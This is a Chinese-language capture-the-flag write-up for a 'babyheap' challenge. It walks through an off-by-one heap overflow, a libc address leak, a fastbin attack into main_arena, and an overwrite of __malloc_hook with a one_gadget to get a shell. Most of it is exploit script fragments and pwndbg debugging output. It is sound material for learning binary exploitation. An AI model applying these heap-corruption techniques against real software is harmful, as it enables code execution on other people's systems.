**学习过程中，参考了以下博文:**

https://blog.csdn.net/qq_33528164/article/details/79951156   这篇我觉得泄露地址的方法最简便，但是最后无法getshell，我的exp是在他的基础下写的。

https://www.jianshu.com/p/959d4b7b5af1

https://www.jianshu.com/p/95b30d754577

**基本利用思路：**

1. 利用了offbyone，修改处于inuse状态的chunk的size，造成chunk overlap来泄露地址，注意free的时候会检查下一个chunk的size的prev_inuse位是否为1.然后通过fastbin attack完成攻击。
2. 由于__malloc_hook附近没有可用的fake_size。上述的博文的利用思路是利用fastbin attack先将chunk分配到main_arena里.方法是利用chunk overlap，将处于fastbin的chunk的fd修改为0x61,再malloc一个size为0x60的chunk，这时fastbin里的内容就会变成0x61，这样就可以使用fastbin attack，将堆分配到main_arena.
3. 然后修改top_chunk到__malloc_hook附近。再次申请chunk即可得到malloc_hook附近的chunk。但是利用过程出现了很多上述博文没有出现的问题。一步一步的调试最终解决问题。下面记录调试过程。

**详细调试过程：**

复现环境：ubuntu 16.04

1. 泄露地址：

泄露地址和修改top chunk都很顺利，但后面会出现很多问题。

```
alloc(0x48) #0
alloc(0x48) #1
alloc(0x48) #2
alloc(0x48) #3 ；防止被top chunk合并
update(0, 0x49, "A"*0x48 + "\xa1") #修改chunk1的size为0xa1
delete(1)   #1 ；free chunk1，chunk1被放入unsorted bin中
alloc(0x48) #1 ；再malloc 一个0x50大小的chunk，那么chunk1被切割，剩余部分放入unsorted bin，被写入地址。即chunk2的userdata部分被写入&main_arena+88
view(2)     #    泄露地址
p.recvuntil("Chunk[2]: ")
leak = u64(p.recv(8))
libc_base = leak - 0x58-libc.symbols["__malloc_hook"]-0x10
```
连续申请4个chunk后的heap布局如下：
```
0x555555757000 FASTBIN {  #chunk0
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757050 FASTBIN {  #chunk1
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570a0 FASTBIN {  #chunk2
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570f0 FASTBIN { #chunk3
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
修改chunk1的size为0xa1:
```
0x555555757050 PREV_INUSE {
  prev_size = 4702111234474983745, 
  size = 161, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```
然后free chunk1,再alloc(0x48):
```
0x555555757050 FASTBIN {
  prev_size = 4702111234474983745, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x5555557570a0 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x7ffff7dd1b78 <main_arena+88>, #原本chunk2里就有了地址，再view即可泄露
  bk = 0x7ffff7dd1b78 <main_arena+88>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

2. dup to main_arena:

```
alloc(0x48) #4 = 2 ；接着上一步，malloc一个0x48的chunk，那么得到chunk4和chunk2是指向同一个chunk的。
delete(2)   # free chunk2 ，此时chunk2被放入fastbin中。
update(4,0x8,p64(0x61))  #修改chunk2的fd为0x61
alloc(0x48)#2, 再malloc一个0x48的chunk，那么fastbinsY[3]=chunk2->fd =0x61. 
```
如图所示：
```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x5555557570a0 ◂— 0x61 /* 'a' */
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
再malloc 一个0x48的chunk：
```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x61  #成功得到0x61,那么就可以将这里当成合法的chunk
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
下面再次构造overlap, 同前面的一样。
```
alloc(0x58)#5
alloc(0x58)#6
alloc(0x58)#7
alloc(0x58)#8
update(5,0x59,'A'*0x58+'\xc1')
delete(6)
alloc(0x58)#6
alloc(0x58)#9=7
```
然后free chunk7，再使用chunk9 修改chunk7的fd到main_arena这里：
```
delete(7)
update(9,0x8,p64(libc_base+dest_offset))
alloc(0x58)#7  ;先malloc一次
alloc(0x58)#10 再malloc一次得到目标chunk。
```
如图：
```
RAX  0x7ffff7dd1b48 (main_arena+40) ◂— 0x0
```
malloc 后rax=0x7ffff7dd1b48，成功得到目标chunk
然后修改top chunk。
到这里就出现问题，得到目标chunk后不知道为什么，unsorted bin 被初始化为0了。这样unsorted bin就corrupt了。在后面修改topchunk后申请chunk，就会报错：
```
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0x7fffffffdc8f ◂— 0x7ffff7dd378000
 RBX  0x7ffff7dd1b20 (main_arena) ◂— 0x1
 RCX  0x7c
 RDX  0x7ffff7dd1b48 (main_arena+40) ◂— 0x0
 RDI  0x7fffffffdc90 —▸ 0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
 RSI  0x7ffff7dd1b40 (main_arena+32) ◂— 0x61 /* 'a' */
 R8   0x0
 R9   0x1999999999999999
 R10  0x0
 R11  0x7ffff7b845e0 (_nl_C_LC_CTYPE_class+256) ◂— add    al, byte ptr [rax]
 R12  0x7ffff7dd1b78 (main_arena+88) —▸ 0x7ffff7dd1b00 (__memalign_hook) —▸ 0x7ffff7a92e20 (memalign_hook_ini) ◂— push   r12
 R13  0x0
 R14  0x2710
 R15  0x7ffff7dd1bc8 (main_arena+168) —▸ 0x7ffff7dd1bb8 (main_arena+152) —▸ 0x7ffff7dd1ba8 (main_arena+136) —▸ 0x7ffff7dd1b98 (main_arena+120) ◂— 0x0
 RBP  0x60
 RSP  0x7fffffffdc10 ◂— 0x555500000006
 RIP  0x7ffff7a8edd4 (_int_malloc+596) ◂— mov    rsi, qword ptr [r13 + 8]
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0x7ffff7a8edd4 <_int_malloc+596>     mov    rsi, qword ptr [r13 + 8] <0x7ffff7dd1b40>
   0x7ffff7a8edd8 <_int_malloc+600>     mov    r15, qword ptr [r13 + 0x18]
   0x7ffff7a8eddc <_int_malloc+604>     cmp    rsi, 0x10
   0x7ffff7a8ede0 <_int_malloc+608>     jbe    _int_malloc+960 <0x7ffff7a8ef40>
    ↓
   0x7ffff7a8ef40 <_int_malloc+960>     mov    r10d, dword ptr [rip + 0x342209] <0x7ffff7dd1150>
   0x7ffff7a8ef47 <_int_malloc+967>     or     dword ptr [rbx + 4], 4
   0x7ffff7a8ef4b <_int_malloc+971>     mov    eax, r10d
   0x7ffff7a8ef4e <_int_malloc+974>     and    eax, 5
   0x7ffff7a8ef51 <_int_malloc+977>     cmp    eax, 5
   0x7ffff7a8ef54 <_int_malloc+980>     je     _int_malloc+2157 <0x7ffff7a8f3ed>
    ↓
   0x7ffff7a8f3ed <_int_malloc+2157>    mov    edi, r10d
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0x7fffffffdc10 ◂— 0x555500000006
01:0008│      0x7fffffffdc18 ◂— 0x58 /* 'X' */
02:0010│      0x7fffffffdc20 —▸ 0x7fffffffdc90 —▸ 0x7ffff7dd3780 (_IO_stdfile_1_lock) ◂— 0x0
03:0018│      0x7fffffffdc28 ◂— 0x0
04:0020│      0x7fffffffdc30 —▸ 0x7fffffffdd40 —▸ 0x7fffffffdd60 —▸ 0x555555555460 ◂— push   r15
05:0028│      0x7fffffffdc38 —▸ 0x7ffff7a62899 (printf+153) ◂— add    rsp, 0xd8
06:0030│      0x7fffffffdc40 ◂— 0xffff800000002371 /* 'q#' */
07:0038│      0x7fffffffdc48 —▸ 0x7fffffffdc8f ◂— 0x7ffff7dd378000
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0     7ffff7a8edd4 _int_malloc+596
   f 1     7ffff7a91dca calloc+186
   f 2     555555554dda
   f 3                0
Program received signal SIGSEGV (fault address 0x8)
```
往前回溯会发现是[rbx+0x70]给r13赋的值：
```
0x7ffff7a8edc7 <_int_malloc+583>    mov    r13, qword ptr [rbx + 0x70] 
   0x7ffff7a8edcb <_int_malloc+587>    cmp    r13, r12
   0x7ffff7a8edce <_int_malloc+590>    je     _int_malloc+1511 <0x7ffff7a8f167>
 
 ► 0x7ffff7a8edd4 <_int_malloc+596>    mov    rsi, qword ptr [r13 + 8] <0x7ffff7dd1b40>

```
rbx+0x70为unsorted bin的地址：
```
pwndbg> x/2gx 0x7ffff7dd1b20+0x70
0x7ffff7dd1b90 <main_arena+112>:	0x0000000000000000	0x0000000000000000
pwndbg> p &main_arena.bins[1]
$1 = (mchunkptr *) 0x7ffff7dd1b90 <main_arena+112>
```
正常情况下的unsorted bin内容为：
```
pwndbg> x/2gx 0x7ffff7dd1b20+0x70
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
```
所以后来覆盖top chunk的时候顺面把bins[1]也给覆盖为正常值来绕过检查：
```
payload='\x00'*0x30+p64(libc_base+libc.symbols["__malloc_hook"]-0x10)
payload=payload.ljust(72,'\x00')
payload+=p64(0x00007ffff7dd1b78-0x7ffff7a0d000+libc_base)#绕过检查，不知道为什么莫名奇妙的会把unsortedbin破坏掉
payload+=p64(0x00007ffff7dd1b88-0x7ffff7a0d000+libc_base)
update(10,0x58,payload)#修改topchunk
```
本以为后面能够正常的进行，发现最后malloc chunk的时候会进行 malloc_consolidate,之前的fastbin已经被破坏掉了,那么就会报错：
```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x61  #成功得到0x61,那么就可以将这里当成合法的chunk
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
所以我又free了 0x50的chunk，顺面用overlap的chunk修改其fd为NULL，再重新申请回来，这样fastbin就为空了：
```
delete(2)#恢复fastbin，由于后面会malloc_consolidate会合并fastbin，会报错，这里用来恢复fastbin
update(4,0x8,p64(0))#将fd修改为0
alloc(0x48)#2将fastbin中的chunk，malloc出来，此时fastbin为空
```
此时fastbin如下:
```
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x5555557570a0 ◂— 0x61 /* 'a' */
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
修改fd后:
```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x5555557570a0 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
然后再malloc回来：
```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
这样就顺利将fastbin清空了,最后顺利修改__malloc_hook为one_gadget，顺利getshell：
```
alloc(0x58)#11 获得到目标chunk
update(11,8,p64(libc_base+one_offset))
alloc(0x58)#触发__malloc_hook
p.interactive()
```
```
[*] Switching to interactive mode
$ ls
babyheap  babyheap.i64    core  exp.py
$ 
```
